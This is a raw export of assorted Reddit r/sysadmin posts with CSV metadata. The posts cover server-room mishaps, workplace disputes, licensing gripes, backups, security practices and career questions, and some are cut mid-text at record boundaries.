I don't know where the next drips are going to start coming from - it could well be directly on to our servers. So I start shutting down everything. Cut the power to the whole server room, turn off the UPS. Look for something to waterproof the racks with - end up using bubblewrap.

After some hard work cleaning the water out from upstairs (yep, cleaning another company's floor on my day off) and calling out an emergency cleaner, I am satisfied that no more water is coming through, and turn everything back on. Eventually get to leave at around 9pm.

It's pure chance that I was even there to catch this. If I hadn't been, the first I'd heard about it would probably have been when things had got way more disastrous, I dread to think how bad it could have been.

Moral of the story - datacentres aren't just for fast internet. Offices are buildings for people, not machines, and are full of environmental hazards to your valuable data, and I'll definitely be looking at re-hosting some of our kit first thing on Monday.",,False,self,t5_2qnp7,False,,,True,t3_zz17x,http://www.reddit.com/r/sysadmin/comments/zz17x/does_your_boss_need_some_convincing_that_proper/,

(not yet 30, but I can see it from here!)  This has me contemplating the future. Where will I be at 40, 50, etc.? 

One thing that has always struck me, but much more so lately, is the lack of older people in IT.  I’m not saying they don’t exist, but the ratio is heavily skewed towards the younger crowd.  I never fully could tell if people just get fed up in our profession and leave, or if they are forced out as they got older, but that is an important distinction for me at this turning point in my life.  I would rather not have to find a new career at 45 or 50.  I know too many people who have had to do this and it’s not pleasant. Doubly so because I anticipate my kids being in their teens at that time.

I do everything right as we’re all supposed to do.  I keep my knowledge current, study my ass off, keep some certs on the resume, etc.  I know what I'm getting into.  I even understand that most IT professionals eventually go to management or specialized fields, and I’m exploring both options.  But even in both of these potentials, there again, I very infrequently run into anyone over 45.

So my question to you /r/sysadmin, and especially to any subscribers who are in their 50’s or 60’s, is this:  

*Is I.T. truly a viable, life long career option or should I be considering other options while I’m still young enough to pursue them?*

I used to work full time for this company for for 3 years and have freelanced for 2. I've now returned to the company to execute a project. Since my Linux skills are now passable, my operational windows duties have been extended to support the customers who are having problems with their unmanaged 3rd party hosted LAMP ecommerce installations.

I identified that MySQL was corrupt on two different instances and would need careful reinstallation by the hosting company. In both cases the sites were up and running but backups had been failing for ages and mysqldump was failing - so the only way to create a backup of the sites was at the file level.

After 2 days of my bosses refusing to accept the system databases were corrupt and demonstrating every failed action I'd attempted, I insisted the only remaining course of action was to raise the issue to the hosting company to reinstall MySQL. If they supported this they would have to:

* Shut down MySQL
* Backup the file data
* Capture the MySQL install specs
* Reinstall to specs
* Restore data

If they didn't support this, they would have to give me the box build specs so I could do this myself. Bear in mind this is unmanaged hosting, but my boss is trying to 'persuade' a technician there to run arbitrary commands for him, so suddenly my boss 'has the power' to run stuff on the server via communicating with the hosting company asking them to run commands blind.

Because the technician was only 1st line, he 'confirmed backups were available' (they were 27k corrupt files - the databases are actually 6 gigs) and that he could 'try restoring the backups or reinstalling MySQL' for him.

I insist neither options are viable because if you:

* Restore a corrupt backup
* Reinstall MySQL without backing up the data files at the file level

You will destroy the customer data. There are **no** backups as it's technically a customer managed server and the database corruption broke the 7 day backup job weeks ago.

One of these customers I've worked with for 5 years. The other was a new customer and his site hadn't started getting traffic.

I was told I had 'wasted two days investigation already' and 'this guy is a senior linux admin and knows much more than you' and that my boss would take me out of the loop and just manage the issue himself.

I said this is the last copy of the customer's online business and there are no backups. Either course of action will destroy his site. He said he would 'take that up with the hosting company' if that happened. I said a years free hosting won't change the fact you're about to give the order to destroy the guy's business.

Anyhow, I stormed out of the office when no agreement could be reached. I was angrier than I ever had been professionally before I think. Like a pro sysadmin I make it my mission to place myself between bad decisions and data destruction, I mentally imploded a bit when I found I couldn't stop him going ahead with this course of action.

Unfortunately, as someone emotionally invested in in the client, I didn't find myself able to just write an arse covering email and let the shit hit the fan.

Speaking to my dad this evening, he suggested making an unauthorised file level backup of the site for when it's destroyed so that I don't have to worry about the client which I am now going to do.

I now have problems! Tomorrow I have to:

* Deal with my boss
* Deal with my coworkers

Both of which have seen me throw a fit over this issue and leave the office early. Because I'm not going to allow the site to be destroyed I'm unlikely to be publically vindicated. How did it come to this?

**TL;DR** Walked out of office in protest of boss about to destroy a client's business. Very stressed and concerned about tomorrow.

**Edit** Result: One customers database was destroyed, the other was saved via intervention from the hosting company not doing as instructed.

**Edit 2**
I'd like to say thank you to the support and technical tips provided by everyone. Whilst I was stressed much of the day over the issue, getting it all written down to allow me to get outside of my head a bit helped me cope better than I would have otherwise.

Final fall out? The customer who's database was lost wasn't yet live so there's basically a few days of unpaid design work to rebuild the recently built site from sources as the financial penalty which the business accepted. I still need to explicitly apologise to my colleagues and my one report for losing my cool with a carefully balanced blend of contrition and complaining.

Users reported slow internet.  I check it quick and notice both WAN links fully saturated.  Check the connections by IP and notice multiple IP's downloading something big (200+ MB).  

With every refresh, more and more computers are downloading similar files from the same couple of servers.

Cut the connection and block the IP's.  The workstations are all still trying to hit them, and more are attempting by the minute.  Looking up the IP of the servers in question doesn't reveal anything particularly useful.  Some blackboxes on the internet. **Oh fuck I've got an outbreak**.

I start isolating the network, killing ports, etc.  Getting ready to kill our internet connection (which cuts off 30+ remote sites and ALOT of people) when Symantec pops up that it has completed updating.  Which is odd because I have it programmed to not update during work hours.

Turns out for some, yet to be determined reason, the management console issued a command to my entire network to update  in the middle of the workday and to *bypass the local server*.  I quickly checked several of the affected machines and sure enough that was it, they were all pulling a large AV update.  No serious harm done, but it scared the shit out of me for a minute there.

We need to perform a dumb backup of a drobo disk array ASAP. It's a 25tb array. So far I've been just moving folders using Explorer, but that's not ideal for obvious reasons (it also seems to break over a few hundred gb). I just tried richcopy but it lacks a few features (mainly an overall progress indicator). Going to try TeraCopy next as I've heard good things.

Am I being a dummy? Is there a better way to create a one-way data dump? At this rate it's going to take us months, and the whole point was to have this dumb backup created while we work on our permanent solution.

EDIT: Sorry guys, we're transferring over an internal network. Not traversing the internet. The drobo that the info is being copied to is in the same room. Still don't know of any faster way than iSCSI through the network (though it's all recently inherited architecture and set up in a boneheaded way, so we're capping around 12MB/s). 

EDIT2: Forgot to mention these were both windows machines, so no rsync unfortunately. Teracopy seems to be working for what I need -  lets me keep adding files as it enumerates them so I can keep each transfer to 1tb at a time. Still going slow, but can't troubleshoot speed until after this is done (everything is in production). Getting 24MB/s with teracopy so it's a bit better now (About 12hrs per tb).

But if anyone has any ideas for how to actually back up this data once this dumb backup is done, feel free to pass them along. We were thinking about using the acronis enterprise backup product (forget the name right now) to facilitate iSCSI backups through the network to a slightly older disk array we had laying around.",,False,self,t5_2qnp7,1368414217.0,,,True,t3_1e7amh,http://www.reddit.com/r/sysadmin/comments/1e7amh/how_would_you_transfer_25tb_of_data_across_a/,

Also, I have developed a super power.",171,45,91,http://www.reddit.com/r/sysadmin/comments/1aqbu1/my_six_month_record_of_no_problems_while_on_call/,"My team swaps being on call each week. We end up one week in five being the one that gets this blasted phone.

But, for the last six months, I have been safe from the vagaries of networking, weather, power, AC and client retardation after hours.

Until now.

I awoke at 0345 with a feeling that something was wrong. My personal phone showed no indications of a friend in trouble. A quick glance around the room showed my wife and husband were sleeping like the dead.

Perhaps I needed to use the toilet? Nope, I don't suffer from incontinence and my bladder doesn't appear to need purging. So I went down to the kitchen and grabbed a glass of water.

Suddenly, I heard it. For the first time in six months, I heard that awful sound. The On Call Phone was receiving a text message indicating something was down.

""Meh, it's probably just a T1 that's bouncing. It'll be back up in a minute,"" I thought to myself.

And then another page came through. And another. And another. A constant stream of digitized noise indicating that there was a massive problem going on.

Three hundred and ninety-two sensors. From our Core routers, to our firewall, to customer colocation cabinets. Everything at our remote location was completely offline. Even our out-of-band access was gone.

I pulled on some pants, threw on a hoodie, grabbed my phones and the car keys and headed out. Visions of a building on fire, or a sunken pit containing the wreckage of my data center were flashing through my mind.

As I neared the location, the sky wasn't lit up with fire. And when I pulled into the parking lot, the building was still standing. Lights glowed within the building, so power was obviously still flowing. The smell of diesel was not drifting through the air, so I can safely assume that the generators didn't need to kick on.

Inside the data center, the sounds of our Liebert HVACs filled the room with its customary background hum. Chugging away in the cages and cabinets were all of the servers our clients put in.

And just as I realize that all seems normal, another three hundred and ninety-two pages start coming in saying that things were returning to normal.

A quick check of our routers show there was no downtime. What could have caused my work day to start three hours early?

It is still unknown and I'm waiting for logs to compile.

Edited to add: Apparently, I didn't make it clear that my super power is the ability to wake up 15 minutes before I get paged.

**Final Update:** Finally tracked down the issue. Co-worker had a sudden case of inspiration for one of his cases and tried removing SNMP for one customer, but accidentally removed the SNMP config for the entire parent group (aka my entire remote data center). He re-added the SNMP credentials after 26 minutes... about the time that I was pulling into the data center.",,False,self,t5_2qnp7,1363879933.0,,,True,t3_1aqbu1,http://www.reddit.com/r/sysadmin/comments/1aqbu1/my_six_month_record_of_no_problems_while_on_call/,

I am deeply concerned over the bill that will be approaching debate soon in the senate. The [S. 1747: Computer Professionals Update Act](http://www.govtrack.us/congress/billtext.xpd?bill=s112-1747) directly impacts me, as your friendly neighborhood IT guy.

I know it may seem like I only speak for my own financial well-being, but you need to understand that IT professionals deserve every dollar of overtime they receive. You see, similar to a doctor or a lawyer, a lot of us are required to be on call 24/7 in order to support the systems that nearly every American uses every day. However, as you can imagine, we don't get paid anywhere near the salaries you can expect in the medical or legal field.

When we get called away on Saturdays during the big Michigan game, or when spending a quiet evening at home with our families, it is not as painful when you know you are being treated fairly by your employer. Many of us also have to stay late more than occasionally, to perform maintenance on critical systems while others are away from their desks. 

It's very easy to abuse and forget about those who don't seem to matter until something breaks. We aren't just cable jockeys or geeks - we are professionals, like the bill says. Please, Senator Levin, vote no if this bill comes across your floor.

Granted we keep all our major systems in a data center, but we still have a rack here at our corporate office for more local stuff. 10 servers or so on site here.

Recently I came in and noticed that a few of my desk drawers were cracked opened, which I never leave them opened. Upon inspection, I noticed that a laptop was taken from one of my desk drawers. It was a broken laptop that I hadn't fixed, so sucks for the thief... but regardless, someone stole from here. I reported it to our HR lady who handles incidents like that, we filed a report with building security... nothing ever came of it, though.

That got me thinking, though, and it raised one question: Does the cleaning staff here at night have a key that could open the door to our server room? We had the main maintenance guy come up here, and he said the cleaning staff have a master key, same as his. He tried his master key on our server room door, and sure enough, it opened.

I didn't like that. So I told management we needed to get that door re-keyed, because there's no reason anyone else needs access to that server room except me, and then one copy of the key for building management to keep in their lock box in case of emergency. I also recommended we get some cheap security cameras, as I regularly keep a lot of expensive equipment in my office.

Long story short, it never happened. Management never approved the cameras or getting the door lock rekeyed. They don't think it's important.

What are your takes on that? Am I overreacting? Or am I perfectly sane in my thought to want more restricted access to our server room and security in my office in case someone ever tried to take something again?

No.

They refuse to run a continuous cat6 cable to the elevator cart, and are blaming us because the other elevator is working.  Since it's working they're blowing off all of my contentions about it not being in spec and only working by the grace of God.

Here is the kicker, this person had the passwords for all the people that work under them, which means now we have to change all those users passwords.

I let management know that I didn't think managers should have user passwords, and this is a great case as to why.

They want to know how they are supposed to access user workstations if they need access to files and the users a out of the office.

My recommendation is the following:

1.  We can reset the password to the user account and then a manager can log in, the manager can then notify the user of the new password, and we require the password to be changed at the next login.

2. We can connect remotely to the machine and pull a file for a manager.

3. Files that need to be accessed by others should be on department shares in the first place.

Any other recommendations on how to handle this?  Do you guys think it's OK to let management have passwords for users under them?

**Edit:**

Thanks for all of the info guys, I should give a bit more information.

I have been in this position of sysadmin/network admin for a little over a month now.  Previously I did small business support.

The reason this happened is that there is not a single IT policy in place, and today is the first I heard of a manager having all of the passwords.

Getting policy's written and implemented will be a learning experience for me and for the company, but I know it is the right thing to do.  When I started this job I walked in to 0 documentation and 0 polices.  As you may have guessed this is just one of many challenges we are facing, the good news is my IT manager is very receptive to my input and we are planning on making a lot of changes.

Getting data off of the desktops is going to be worked on, folder redirection is not enabled for anyone, only a few users have home folders, and the main file share is an unorganized disaster.

I have The Practice of System and Network Administration on the way to me, which I think is going to be a great help.


I seem to remember a site that has a lot of IT policies that can be adapted to fit a company's needs, can anyone provide a link to that?

Each blade has 128 (expandable to 512) GB of ram and 2 processors (8 cores, hyperthreading) for 32 cores.

We have 4 blades (8 procs, 512GB ram (expandable to 2TB in the future). 


If i go with VMWare vSphere Essentials, I can only license 3 of the 4 hosts and only 192GB (out of 384). So 1/2 my ram is unusable and i'd dedicate the 4th host to simply running vCenter and some other related management agents. This would cost $580 in licensing with 1 year of software assurance.

If i go with VMWare vSphere Essentials Plus, I can again license 3 hosts, 192GB ram, but I get the HA and vMotion features licensed. This would cost $7500 with 3 years of software assurance. 

If i go with VMWare Standard Acceleration Kit, I can license 4 hosts, 256GB ram and i get most of the features. This would cost $18-20k (depending on software assurance level) for 3 years.

If i go with VMWare Enterprise acceleration kit, I can license 3 hosts, 384GB ram, and i get all the features. This would cost $28-31k (again, depending on sofware assurance level) for 3 years. 

Now...

If I go with HyperV on Windows Server 2012, I can make a 3 host hyper-v cluster with 6 processors, 96 cores, 384GB ram (expandable to 784 by adding more ram or 1.5TB by replacing with higher density ram). I can also install 2012 on the 4th blade, install the HyperV and ADDC roles, and make the 4th blade a hardware domain controller and hyperV host (then install any other management agents as hyper-v guest OS's on top of the 4th blade). All this would cost me 4 copies of 2012 datacenter (4x $4500 = $18,000). 

... did I mention I would also get unlimited instances of server 2012 datacenter as HyperV Guests?

so, for 20,000 with vmware, i can license about 1/2 the ram in our servers and not really get all the features i should for the price of a car.

and for 18,000 with Win Server 8, i can license unlimited ram, 2 processors per server, and every windows feature enabled out of the box (except user CALs). And I also get unlimited HyperV Guest licenses. 


... what the fuck vmware?

TL;DR: Windows Server 2012 HyperV cluster licensing is $4500 per server with all features and unlimited ram. VMWare is $6000 per server, and limits you to 64GB ram.

I offered to migrate to nginx. My own nginx knowledge at that time was very noob level but over one weekend I was able to setup his server with ngingx + varnish. The memory usage came down to 3gb on average and CPU usage never left more than 15%.

It hasn't been going well.

I have read around 50 resumes and interviewed only 2 people, and I am quite disappointed with the results. If anyone is ever wondering why you don't get a callback, look at your resume, they are embarrassing. Horrible typos, lousy grammar, flat out errors, this is supposed to represent you and if your resume is garbage why would I want to meet you? I don't care if you're a child prodigy that can solve any problem, how would I know that if your resume sucks? Also, don't lie on your resume, it makes us all look bad. Get  someone to proofread it for you, it helps.

Interviews are fun, it has been interesting to be on the other side of the table. Out of four I had booked this week, one dropped out, one was a no show, and I had two come in that were so under qualified that I won't have them back for round two. The one guy only wanted the job because it was near his house (he had nothing else to offer) and the other guy was supposedly an MCSE with absolutely no experience despite being in the field for 3 years. So overall a waste of time.

I have two more next week, so hopefully I'll find someone good. I never realized the crap hiring managers had to go through.

Edit: Wow, I didn't expect this to take off the way that it did, thanks for the input on everything. It is interesting to read everyone's opinion (I got quite a few PMs too), apparently this is a sensitive subject. I just wanted to clarify a few points:

* I am new to the whole interview process from a ""hiring"" perspective. As the sysadmin being asked to assist with looking for a new hire, I am being asked to help screen candidates by reading through submitted resumes and sitting in on interviews to ask my own questions since I will be working directly with the new hire. This has been going on since early January and I finally convinced my boss and HR to allow me to assist since I will be working directly with this individual and they were making no progress on hiring someone.
* I worked closely with the necessary people to update the job description for the new hire since it was lacking a lot of details originally. I have also had my job description updated with management and HR since mine was also lacking in the necessary details. I do this job 40 hours a week and am on call 24/7, so I know exactly what is involved for our environment.
* I have nothing but respect for hiring managers that have to deal with this for a living. I couldn't deal with it, it would drive me insane. I have dealt with recruiters in the past and I have only ever had one that actually got me a job. The rest wasted my time and still call me to continue wasting it despite me telling them to stop. 
* I stand by my opinion on the lack of quality on resumes. If you can't take the time to present yourself well in a document that is meant to showcase your skills then I have no confidence in your ability to do the job. I work at a company that deals with financial institutions and some government agencies. Attention to detail matters. If your resume sucks, then I doubt your emails and documentation will be any better, and that is important to me and my managers.
* I am not opposed to having someone train on the job, within reason. I would expect someone who applies as a Systems Administrator to be able to walk into an environment and be able to figure things out. I have seen a lot of people let go before their probation runs out because someone realized they didn't know what they were doing on day 89 of 90.",,False,self,t5_2qnp7,1368939390.0,,,True,t3_1ekqby,http://www.reddit.com/r/sysadmin/comments/1ekqby/crappy_resumes_and_interviews/,

**Use:**

1. Import ""Installers.xml"" and ""Uninstallers.xml"" files into PDQ deploy.

2. Copy all files from ""installers"" to wherever your repository is.

3. All our jobs reference the **$(Repository)** variable, so as long as you have it set in PDQ's preferences you're golden.

**Notes:**

1. Make sure to read job notes for each package, they explain what it does. Basically, this is how we set up our jobs:
 - If there is a .bat file with a job, it needed help to install silently (OR the .bat makes some customizations). You can edit the batch files to see what they're doing; most just delete ""All Users"" desktop icons and stuff like that.
 - If there ISN'T a .bat file with a job, then it does silent installs natively.
 - All jobs have the option ""Copy all files in the directory"" checked to bring their files with them to the remote computer. I've found this works better than having jobs pull files individually during install.

2. **Thunderbird**:
 - Our (customized) Thunderbird uses a global config file on the network. This lets us change Thunderbird settings en masse for the entire network if we need to. 
 - You can disable this behavior OR set the location of the global config file by tweaking the 'thunderbird-custom-settings.js' file the job copies over.
 - A copy of the global config file we use is in the Thunderbird (customized) directories and is called 'thunderbird-global-settings.js' 

3. **Firefox**:
 - 'Firefox v15.0.0 (default)' isn't there, because the [site we get Firefox MSI's from](http://www.frontmotion.com/Firefox/download_firefox.htm) hasn't released a v15 yet.
 - 'Firefox v15.0.0 (customized)' works fine.

I spoke with a client who wants to upgrade the server that run his security cameras.  The server it's running on is getting a little aged, needs more ram/hdd/etc, but being a single core P4, it's not worth it.  I called the software vendor for instructions on migrating it to new hardware and was told that... Sorry!  The serial key is tied to the MAC ADDRESS of the server's NIC (which is on-board), and to generate a new key for the new server would take 48 hours and $250.  

I asked ""What if the NIC was to die and needed to be replaced?  Or what if I decided to add a second NIC in order to team the two for redundancy? Or what if I wanted to upgrade the existing 10/100 card with a gig card?""  Their response was ""48 hours and $250""...

Yes I can clone the mac address, but that's not the point...  I would *almost* understand if they said it was locked to the *machine* ala MS OEM licenses (which I also despise), but to tie a license to a single component which is quite likely to be change/upgraded/duplicated/die while leaving the system otherwise in perfect working order is just ludicrous...

Needless to say, I spent the next couple hours testing out various open source solutions. iSpy seems to fit the bill and while is not the quickest or easiest to configure, it is more flexible and feature rich and won't try to screw us out of extra money for no reason.

For the record: I am an MSP, and had absolutely nothing to do with the initial purchase of the system or software.

Thanks for listening :)

**Edit:**  Wow, I can't believe the response.. I'm certainly glad that I'm not the only one who hates predatory licensing.  I am surprised at how common MAC address based licensing is though.  I can only hope that given time things will change.

Even though this information was accessed, the passwords stored by Evernote are protected by one-way encryption. (In technical terms, they are hashed and salted.)

While our password encryption measures are robust, we are taking steps to ensure your personal data remains secure. This means that in an abundance of caution, we are requiring all users to reset their Evernote account passwords. Please create a new password by signing into your account on evernote.com.

After signing in, you will be prompted to enter your new password. Once you have reset your password on evernote.com, you will need to enter this new password in other Evernote apps that you use. We are also releasing updates to several of our apps to make the password change process easier, so please check for updates over the next several hours.

As recent events with other large services have demonstrated, this type of activity is becoming more common. We take our responsibility to keep your data safe very seriously, and we’re constantly enhancing the security of our service infrastructure to protect Evernote and your content.

There are also several important steps that you can take to ensure that your data on any site, including Evernote, is secure:

Avoid using simple passwords based on dictionary words
Never use the same password on multiple sites or services
Never click on 'reset password' requests in emails - instead go directly to the service

Thank you for taking the time to read this. We apologize for the annoyance of having to change your password, but, ultimately, we believe this simple step will result in a more secure Evernote experience. 

If you have any questions, please do not hesitate to contact Evernote Support.

These are scripts that are run on the client that will take a base company template and create a signature in Outlook based on the user's AD info (kind of like a mail merge). 

There are two files - one for the main signature, and one for a reply signature (since most people like a slightly different or shortened reply signature). All I did was remove my company specific information and replaced it with contoso, so all you should have to do is replace references to 'contoso.local' in the script, and you're good to go. The powershell code itself is heavily commented, so you should be able to work your way through it. Essentially, just place the template files in \\contoso.local\netlogon\sig_files\contoso\ and then you're off and to the races.

I've tested and deployed this on a Win7 environment and Terminal Server 08R2 environment running Outlook 2010. Since implementing this, our users and management have been very happy - no more custom signatures with purple Arial-Bold font.

You might even have heard of him.  His name is Dev Null.  I think he's Indian, but we're not really sure.  

As soon as one of us gets a cold call that we don't feel like dealing with, we punt to Dev.  ""Oh, oh..I get it now.  You want to talk to Dev, he's the guy responsible for \&lt;blank\&gt;.  Let me transfer you...""

I've been doing this for 13 years.  Our rule is: anyone who figures it out, passes the test, and earns a shot.  In all that time, exactly one person figured out what was going on, and called us on it. 

After doing this for a while, Dev got to be on everyone's mailing list as an IT manager.  They started calling him directly, instead of us.  Everyone thinks he's the boss.

* We got this guy back up, but were all a bit concerned about this ESX host.

Currently it is the most common reported issue per MS.",134,19,153,http://www.reddit.com/r/sysadmin/comments/1e967n/outlookoffice_365_connectivity_problems_after_two/,"Symptoms: Outlook 2007 and 2010 (unknown about 2013) will hang on the send/receive operation.  Outlook itself doesn't hang, it just stops sending/receiving (often leaving messages stuck in the outbox) until you close Outlook and reopen the application - after doing this it will work for awhile then stop again.

Checking the server connectivity (control + right click the outlook icon in the system tray) reports normal server connectivity.  Autoconfiguration settings (in the DNS record) are verified to be correct (also control + right click the systray icon).

So far the troubleshooting steps proposed by Microsoft are:

* Step 1. Ensure that your Operating System and Software are up to date.

* Step 2. Repairing your profile may resolve your connection issue.

* Step 3. Verifying Connectivity and Autodiscover settings.

These have proven to be ineffective.

There is no ETA for a fix.

Office 365 recently went through some software/server upgrades/moves/something and support engineers at Microsoft say that many things went wrong and they are struggling to fix everything that went wrong.  I have another issue that was reported 2 1/2 weeks ago (unrelated to the connectivity problems but related to the server moves) and I just received word that they have finally diagnosed that problem but it will take ""a few more days"" to resolve because Office 365 is ""a multi-tenant environment"".

Meanwhile, every user in our office is stuck with this very disruptive problem.  There is no workaround yet known (or at least yet provided by Microsoft) other than to use the online portal (OWA for Office 365) but this is an imperfect solution as it breaks mailto: functionality.

Basically I feel I am probably above average skillset when it comes to using desktop Linux. But I also appreciate that this is the equivalent to the CEO's kid knowing all about Windows XP; administering a domain, Exchange...etc. is the rest of the iceberg.

So... my question. What can I learn that will push me from being ""Desktop Linux hobbyist"" into ""equipped to handle mulitple Linux servers,"" and then on to ""managing hundreds of Linux servers with one arm tied behind my back.""

For side projects I'm running a few Debian boxes across the internet. As everyone I started with manual aptitude invokes, later added unattended-upgrades for security upgrades, but I would like to move to a puppet setup so that I spend less time on that later.

The setup I'm dreaming of is a git repository which describes all the machines I admin, and on a push the configuration is updated (it also receives security updates automatically). When something goes wrong, I get a notification ; and I also can query the status of boxes.

Right now, I started writing a few manifests for my machines (one per project), and I put a ""puppet apply"" entry in the root crontab. How can I move to a centralised setup from there ?

More specifically, here are my questions :

  - do I need a new box specifically to run as a puppet master ? Or can I run it on one of the existing boxes ?
  - is it necessary that the puppet clients stay connected to master ? does it generate a lot of bandwidth ?
  - can I easily implement the git workflow I described above ? (or if there's a better idea please let me know)
  - how do you handle new boxes ? I started writing a ""bootstrap"" script to install puppet and its dependencies, but maybe using a custom AMI (for EC2) or preseeding (for real boxes) is better.

**Edit**: Thanks to everyone for the excellent advice. It seems like the top 3 free solutions are:

1. [Samba+winbind &amp; Kerberos](http://itscblog.tamu.edu/joining-samba-to-a-windows-2008-r2-domain/) (Packysauce gives an excellent write-up [here](http://www.reddit.com/r/sysadmin/comments/12uyil/fellow_sysadmins_working_in_mixed_winnix/c6yc8vv)).

2. [PBIS](http://www.beyondtrust.com/Technical-Support/Downloads/PowerBroker-Identity-Services-Open-Edition/?Pass=True) (PowerBroker Information Services), formerly called Likewise-open, recommended by [8+ people](http://www.reddit.com/r/sysadmin/comments/12uyil/fellow_sysadmins_working_in_mixed_winnix/c6ybxml) in this thread.
3. [Centrify Express](http://www.centrify.com/express/free-active-directory-tools-for-linux-mac.asp#agents), also recommended, and more enterprise-focused than PBIS/likewise-open, although a couple people mentioned having issues with SSH authentication.

Additionally, I found [this comparison paper](http://www.scribd.com/doc/64197382/Comparing-Centrify-Versus-Likewise-Open-and-Windbind) on Scribd comparing winbind, PBIS and Centrify express for Active Directory authentication in mixed environments.",Question - Solved,False,self,t5_2qnp7,1352827910.0,,,True,t3_12uyil,http://www.reddit.com/r/sysadmin/comments/12uyil/fellow_sysadmins_working_in_mixed_winnix/,

I was hired as a network technician at my company about 6 months ago, it's a relatively small company that does networking, VoIP and traditional phone systems. I was hired to primarily work on Cisco gear as I have a CCNA certification.This is my first real IT job, though I did do a 3 month internship prior to this doing similar work. My background is definitely more focused on the networking side of IT.

With the companies IT manager leaving, I have been given a promotion of sorts (a raise too!). I am now responsible for administering our production servers. We have 6 Linux servers that we provide SIP service to some of our clients, both to IP PBXs and individual phones. I am familiar with the basics of Linux (using simple commands to navigate folders, copy files, start and stop services, use packages to install things), but I certainly don't feel like I know what I am doing compared to an actual Linux Administrator. These serers were set up by a third party, and I feel out of my league. 

I already know I need to learn about doing backups (Should I back up the whole drive, or just the MySQL databases??). I need to learn how to properly manage hardware, such as how do I install a new disk and mount it? Some  servers are clustered, I know there is a virtual server in this setup, but how do I manage clustering?

Does anyone have any advice for me? what tasks should I try to learn? any good resourcesI could read?



**Edit**

Thanks for all the replies everyone!

I plan on ordering a copy of *The Practice of System and Network Administration* as I have seen this book recommended frequently

Having a dev VM is obviously a great idea, but building one form scratch may not be possible. There is proprietary software running on these servers, so the company that set them up probably won't let me have access to all the source files. I will see if I am allowed to image one of the servers during a maintenance window to get a dev copy for myself.

Thanks for all the suggestions regarding backup and monitoring software, I will research the suggestions to see which ones I will want to try.",,False,self,t5_2qnp7,1367171439.0,,,True,t3_1d8ylf,http://www.reddit.com/r/sysadmin/comments/1d8ylf/apparently_i_am_a_server_admin_now_looking_for/,

It seems the expectations of most are to get in and work hard, then grow in knowledge and promote out. This happens, but not regularly in short order.

New staff expect promotion after learning their position in redundant tasks and the realistic expectation is about 12 - 18 months in any role before there's movement.

When you get hired anywhere, there is no guarantee to be promoted after your probation period, nor do most promotions come out of the blue.

Companies have staffing needs. If you want to excel quickly, learn your job and the job you want to grow into then start offering your extra availability to that manager/team/department.

Almost right away we get a call saying it's infected and hacked again.  I couldn't believe it so I went back upstairs and watched.  Sure enough the cursor was moving all on its own.  I was surprised to say the least, so I unplug the network cable, and the issue stops.  Plug the network cable back in, starts back up again.  But after watching the cursor for awhile I started to realize it was moving without purpose.  Like someone was moving it, but while looking at a different monitor.  At this point I realized the laptop had a wireless mouse in it, so I looked around and saw someone in the next room who was also using a mouse, having this user stop their movements resolved the issue.

Why did plugging and unplugging the cables affect the problem?  The network cable was pushing against the wireless mouse receiver, so when it was plugging in and touching the adapter, it was acting as a big ol' wireless mouse receiver antenna.

So I realized i'd become the stereotypical pissed off admin that everyone was stepping on eggshells around.   I just wanted to give an update of the direction that I went.

What did I do:   

I went to my management and explained how I felt and what my situation was, my manager came to the same conclusion that many of you did,  I was burning out.  He went with me to our HR dept and we explained the situation to them.   HR was extremely positive about tie whole situation.  They hooked me up with 2 great communications classes that were being held for some of our client facing consultants.  One of which was in NY, and my boss allowed me to stay over the weekend on the company dime and have my wife come up to stay with me (gramma watched the kids) to get some non-work related R&amp;R.

From the classes I learned a couple key things (amongst many)

1.  My written communications were very ""unfriendly""  I would simply state (or demand) what I wanted without much courtesy.  I spent a chunk of time focusing on rewording emails to *ask* for what I needed, and then explain why it was critical, important, or just plain run of the mill.  I also learned how to properly write emails showing displeasure with someones actions/activities without using such words as 'asshat', 'douchenozzle', and my (old) personal favorite 'donkey-rapist'.

2.  I needed to step up my verbal communications.  I am a remote employee and had lost touch with the 'haps in the office.  Since most of my communication was via IM and email I rarely actually talked to many of my coworkers.   Anything that would take more than 2 back-and-forths over IM I pick up the phone for now.   I think I've learned more about my coworkers in the past three weeks than in the past 4 years.  

Number 2 I think was the key for me, it's AMAZING the difference I see from my peers now that I talk to them on a regular basis.  I've actually been told that I was considered a ""black box"".   Request came from me, data went in, and stuff got spat out with no concept of what happened in between.  Now that I've been communicating more with them they have more of a sense of what I'm doing and why I'm doing it.

So I know that sometimes that the HR is the big evil monster who just wants you to do paperwork, but there are times when they can actually provide you with benefit of such things.  It worked out really well for me.   Also by talking to my boss he's been helping me rebalance my workload so that I can actually take some time away from work to help reduce the amount of burnout I've been feeling.

In the end, my best bet was to speak up or leave the company.  I'm glad I spoke up.",,False,self,t5_2qnp7,False,,,True,t3_s76yq,http://www.reddit.com/r/sysadmin/comments/s76yq/turning_into_the_bofh_update/,

Recently I have been asked to do something that I find rather questionable. One of the things that we do is spider data from various websites.  One of those sites has requested that we NOT do that anymore.  Today I received a deliberately informal request to install TOR on several machines in order to circumvent their ability to detect us.  I was objectionable at first but I received a phone call from a member of local upper management, and was basically told that this is the thing to do, if I don't want to rock the boat. I was asked to do this and not mention it.


I have (in almost a year) not been provided with actual policies from our corporate office (my ""boss"").  I know that this is an ethical no no, and personally I feel a moral obligation to not allow this practice.  What are the potential implications from this act? Am I legally liable?

I am not sure if we all had similar close calls but i hope i am not alone. 

My junior wanted to learn scripting and wrote a bat file for xp that deletes a folder in current users's local app data folder. He asked me to test it in group policy. I wanted to extra mile and make the script work on both windows 7 and xp. I modified the script by adding %localappdata% in path. test it on my win 7 machine and proudly created a new policy to send it it's way. 

Little did i know that this path does not exist in XP. 2 hours after doing all this i get my first call, a users' machine is getting bsod and isn't able to log in. i though it is isolated issue. not long after first report, machines started dropping like flies. 

I knew something went wrong somewhere. I quickly disabled the policy and deleted the script from all dc's to minimize the effect. tested the command in xp and ound that there is is no localappdata in xp and script just deleted all files in c and it's sub directories. 

In the end we had 50 or so machine dead out of 2000. I went to my Manager and explained the situation expecting write up or worse being let go. I was ready for the worse.

My manager laughed it off and said don't worry and go back to desk. this will keep the help desk busy and give them something to do. Did not see that coming.

After writing scripts for over 10 years, this 1 liner almost got me fired. 

What were the close calls in your IT career? Any script misshapes?


TL;DR: created a gp with script that almost deleted all files of all workstations running xp. told manager and everything worked out.

The job was labeled as entry level, they liked my attitude and willingness to learn... 1 Major problem, the old IT guy quit a week before i got the job, and is not available to answer questions for quite some time.  AND as the title says, i am in waaaaaay over my head

I wish i could use more professional terms to describe my situation, but i will do the best i can based off of the little bit of paperwork i have been left.  
